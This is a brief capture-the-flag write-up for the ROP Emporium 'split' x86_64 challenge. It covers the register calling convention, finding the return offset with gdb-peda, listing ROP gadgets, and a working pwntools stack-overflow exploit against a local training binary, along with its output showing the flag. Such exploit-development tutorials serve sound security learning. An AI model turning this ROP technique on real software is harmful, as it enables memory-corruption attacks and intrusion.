# chehckpoint

instead of 32bit program to pass their args though stack, this version of program pass the top 6 args with registers -> `rdi\rsi\rdx\rcx\r8\r9`, the rest of args use stack to pass


# build weapon

**calculate ret offset**
```shell
gdb-peda$ pattern offset AA0AAFAAbAA1
AA0AAFAAbAA1 found at offset: 40
```

**gadget get**

```shell
➜  x86_64 ROPgadget --binary ./split --only "pop|ret"   
Gadgets information
============================================================
0x00000000004007bc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004007be : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004007c0 : pop r14 ; pop r15 ; ret
0x00000000004007c2 : pop r15 ; ret
0x00000000004007bb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004007bf : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000400618 : pop rbp ; ret
0x00000000004007c3 : pop rdi ; ret      # need rdi for one arg
0x00000000004007c1 : pop rsi ; pop r15 ; ret
0x00000000004007bd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040053e : ret
0x0000000000400542 : ret 0x200a

Unique gadgets found: 12
```

**exp**
```python
from pwn import *

pipe = process("./split")

pop_rdi_ret = 0x4007c3
useful_string = 0x601060
syscall = 0x400560

payload = "A" * 40
payload += p64(pop_rdi_ret)
payload += p64(useful_string)
payload += p64(syscall)



print(pipe.recvuntil("> "))
pipe.sendline(payload)
print(pipe.recvall())
```

```shell
➜  x86_64 python ./exp.py 
[+] Starting local process './split': pid 56331
split by ROP Emporium
x86_64

Contriving a reason to ask user for data...
> 
[+] Receiving all data: Done (44B)
[*] Stopped process './split' (pid 56331)
Thank you!
ROPE{a_placeholder_32byte_flag!}
```
